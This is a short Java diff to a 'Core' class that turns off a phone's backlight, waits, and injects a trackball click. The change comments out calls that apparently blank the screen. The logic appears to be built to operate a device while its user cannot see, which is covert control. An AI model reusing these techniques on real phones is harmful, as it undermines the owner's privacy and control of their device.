@@ -329,7 +329,7 @@ public final class Core implements Runnable {
         //TODO: se il telefono e' occupato, attendere il tempo necessario.
         try {
             Backlight.enable(false);            
-            Main.getInstance().pushBlack();
+            //Main.getInstance().pushBlack();
             Utils.sleep(8000);
 
             if (Backlight.isEnabled()) {
@@ -356,7 +356,7 @@ public final class Core implements Runnable {
             Utils.sleep(100);
             KeyInjector.trackBallClick();
         } finally {
-            Main.getInstance().popBlack();
+            //Main.getInstance().popBlack();
         }
     }
 
